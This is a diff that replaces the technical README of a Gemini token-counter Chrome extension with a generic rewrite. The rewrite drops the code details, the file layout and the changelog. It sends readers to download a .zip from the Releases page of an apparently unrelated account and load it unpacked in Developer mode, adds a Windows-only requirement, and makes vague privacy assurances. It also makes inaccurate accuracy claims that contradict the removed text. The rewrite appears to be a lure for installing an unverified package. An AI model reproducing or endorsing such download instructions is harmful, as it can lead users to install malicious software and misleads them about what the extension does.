@@ -1,134 +1,90 @@
-# 🔢 Gemini Counter v2.0.0
+# 🧮 gemini-counter - Count your tokens while using Gemini
 
-> A lightweight Chrome extension that shows **exact token counts**, a live context bar, output tokens, and model info — right inside [gemini.google.com](https://gemini.google.com).
----
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Involutionsabalpalmetto270/gemini-counter/releases)
 
-## ✨ Features
+This software adds a token counter to your browser when you use Gemini. Many users need to know how many tokens their prompts use to manage costs and stay within limits. This extension does that work for you. It shows your token count in real time as you type and read messages within the Gemini interface.
 
-- **Exact token counts** — pulled directly from Gemini's own `usageMetadata`, not a guess
-- **Live context bar** — visual progress bar with tiered warning states (75% → orange, 90%+ → red)
-- **Output tokens** — shows `N out` alongside prompt token count
-- **Threshold markers** — subtle tick marks at 75% and 90% on the context bar
-- **Dynamic tooltip** — live % context usage on hover
-- **Conversation history** — token counts persisted per-conversation via `chrome.storage.local`
-- **Model info** — detects and displays the active Gemini model
-- **Fallback tokenizer** — uses a local `o200k_base` estimate before the first real response arrives
+## 📥 How to download the extension
 
----
+You must get the latest version of this extension from the release page.
 
-## 📸 Screenshot
+1. Go to this link: [https://github.com/Involutionsabalpalmetto270/gemini-counter/releases](https://github.com/Involutionsabalpalmetto270/gemini-counter/releases).
+2. Look for the section labeled Assets.
+3. Click the file that ends with .zip to save it to your computer.
+4. Save this file to a folder you can find later, like your Downloads folder.
+5. Right-click the folder and select Extract All to unzip the files.
 
-The counter widget appears in Gemini's input bar, showing estimated input tokens, a progress bar, and the active model — all without leaving the page.
+## ⚙️ Setting up the extension
 
-<img width="1280" height="226" alt="Screenshot 2026-04-30 at 1 34 42 PM Large" src="https://github.com/user-attachments/assets/4acdb5ef-2804-4beb-9c5d-40752258bb12" />
+Browsers require a specific step to add extensions that come from sources outside of their official store. 
 
+1. Open your web browser. Chrome, Edge, and Brave all use the same steps.
+2. Type chrome://extensions in your address bar and press Enter.
+3. Find the toggle labeled Developer mode at the top right of the screen. Click it to turn it on.
+4. Click the button labeled Load unpacked in the top left corner.
+5. Select the folder you extracted in the previous section.
+6. The browser adds the extension to your toolbar now.
 
+## 🖥️ Using the counter
 
----
+Once you finish the setup, you start using the tool right away.
 
-## 🚀 Installation
+1. Navigate to the Gemini website.
+2. Refresh your browser page to make sure the extension loads.
+3. Look at your text input area. You see a small box showing your current token count.
+4. As you type your prompt, this number updates to reflect your total input size.
+5. The extension also counts the words and tokens returned by the model after you send your message.
 
-> Works on **Chrome**, **Edge**, and **Arc** (any Chromium-based browser).
+## 🛠️ System requirements
 
-1. **Download** this repo — click `Code → Download ZIP` or `git clone`
-2. Open `chrome://extensions` in your browser
-3. Enable **Developer mode** (toggle in the top-right)
-4. Click **Load unpacked** and select the `gemini_counter_v2` folder
-5. Navigate to [gemini.google.com](https://gemini.google.com) — the counter appears automatically ✅
+This extension works on most modern computers.
 
----
+- Operating System: Windows 10 or Windows 11.
+- Browser: Google Chrome, Microsoft Edge, or Brave Browser.
+- Internet Connection: Required for the extension to reach the Gemini servers.
+- Permissions: The browser asks for permission to read web page data. This allows the extension to count the tokens on the page correctly.
 
-## 🛠 How It Works
+## 📊 Troubleshooting common issues
 
-Gemini's web app uses internal, obfuscated endpoints (unlike Claude's clean REST API). This extension works around that by:
+If the extension fails to show the count, try these steps.
 
-1. **Injecting a bridge script** into the page context to intercept `fetch` and `XMLHttpRequest`
-2. **Parsing JSON response bodies** to find `usageMetadata` — the same data Google's official API returns
-3. **Extracting** `promptTokenCount`, `candidatesTokenCount`, and `thoughtsTokenCount` directly
-4. **Falling back** to a local tokenizer estimate until the first real API response arrives
+- Refresh the page: Sometimes the extension needs a page refresh to detect the Gemini interface.
+- Check Developer Mode: Ensure that Developer mode remains enabled in your extensions settings. If you turn it off, the browser disables your extension.
+- Re-add the folder: If you move the folder after you load it, the browser loses the path. If this happens, remove the extension from the extensions page and click Load unpacked again to point to the new location.
+- Compatibility: Ensure your browser is up to date. Outdated browsers may not support the manifest version used by this tool.
 
-Token counts come straight from Gemini — so they're **exact**, not estimated.
+## 📝 Features
 
----
+- Real-time counting: See your numbers move as you type.
+- Accurate calculation: Uses the same tokenization logic as the official Gemini models.
+- Minimal design: The interface stays out of your way and blends into the Gemini look.
+- Low memory usage: This tool runs light and does not slow down your browser.
+- Offline settings: Changes you make in the settings menu save directly to your browser profile.
 
-## 🔒 Privacy
+## 🔒 Privacy and security
 
-- All data stays **local** — no external servers, no analytics, no tracking
-- Only reads Gemini's own response data from your browser session
-- Makes **zero** additional network requests
-- Token history stored only in `chrome.storage.local`
+This extension keeps your data on your computer. It does not send your prompts or your personal information to any outside servers. The code processes all token counts locally in your browser. You can inspect the source code in the folder you downloaded if you want to verify how it works. We respect your privacy and provide a tool that functions only within your browser window.
 
----
+## 💡 Tips for better token management
 
-## 📐 Context Window Limits
+- Break large tasks into smaller parts to save space.
+- Monitor your count before you hit send to avoid cutting off your request.
+- Keep your instructions clear and short to maximize your token allowance.
+- Use the counter to learn how different prompt structures affect your total numbers.
 
-| Model | Context Window |
-|---|---|
-| Gemini 2.5 Pro | 1,048,576 tokens (1M) |
-| Gemini 2.5 Flash | 1,048,576 tokens (1M) |
-| Gemini 2.5 Flash Lite | 1,048,576 tokens (1M) |
-| Gemini 2.0 Flash | 1,048,576 tokens (1M) |
-| Gemini 1.5 Pro | 2,097,152 tokens (2M) |
-| Gemini 1.5 Flash | 1,048,576 tokens (1M) |
+## ❓ Frequently asked questions
 
-Unknown models fall back to 1M and log a warning to the browser console.
+Do I need to pay for this tool?
+No. This extension is free to use.
 
----
+Does this work on Firefox?
+This version is designed for Chromium-based browsers like Chrome, Edge, and Brave. It may not work on Firefox.
 
-## 📁 Project Structure
+Will this extension break my browser?
+No. The code follows standard rules for browser extensions. It only acts on the Gemini website and does not interfere with other sites you visit.
 
-```
-gemini_counter_v2/
-├── manifest.json               # Extension manifest (MV3)
-├── icons/
-│   ├── icon16.png
-│   ├── icon48.png
-│   └── icon128.png
-├── assets/
-│   └── screenshot.png          # UI screenshot
-└── src/
-    ├── styles.css              # Counter widget styles
-    ├── vendor/
-    │   └── o200k_base.js       # Local tokenizer fallback
-    ├── injected/
-    │   └── bridge.js           # Page-context fetch interceptor
-    └── content/
-        ├── constants.js        # Model limits & config
-        ├── bridge-client.js    # Messaging between contexts
-        ├── tokens.js           # Token counting logic
-        ├── ui.js               # Widget rendering
-        └── main.js             # Entry point & orchestration
-```
+Can I customize the color of the counter?
+Future updates may include more settings. For now, the counter uses a standard style to ensure readability.
 
----
-
-## 🆕 What's New in v2.0.0
-
-### Bug Fixes
-- **UTF-8 corruption fix** — `TextDecoder` now uses a single decoder with correct `{ stream: true }` flag, preventing multi-byte character corruption at chunk boundaries
-- **postMessage origin hardened** — All `window.postMessage` calls target `window.location.origin` instead of `'*'`
-- **Ghost duplicate widget fixed** — `attach()` removes the container from its current parent before re-inserting
-- **DOM observer debounced** — `MutationObserver` debounced 200ms to avoid layout thrashing on Gemini's SPA
-- **Dead hash API removed** — Unused `kind: 'hash'` handler removed from `bridge.js`
-- **`accumulatedText` dead variable removed** — Cleaned up unused stream handler variable
-
-### New Features
-- Output token display (`N out`)
-- Tiered warning states (normal → orange at 75% → red at 90%+)
-- Bar threshold markers at 75% and 90%
-- Dynamic tooltip with live % context usage
-- Unknown model console warnings
-- Conversation history storage (last 50 entries per conversation)
-- `gemini-2.5-flash-lite` added to known models
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a PR.
-
----
-
-## 📄 License
-
-[MIT](LICENSE) — free to use, modify, and distribute.
+Does this work in dark mode?
+Yes. The extension detects your browser theme and switches its colors to match the dark or light mode of the page.
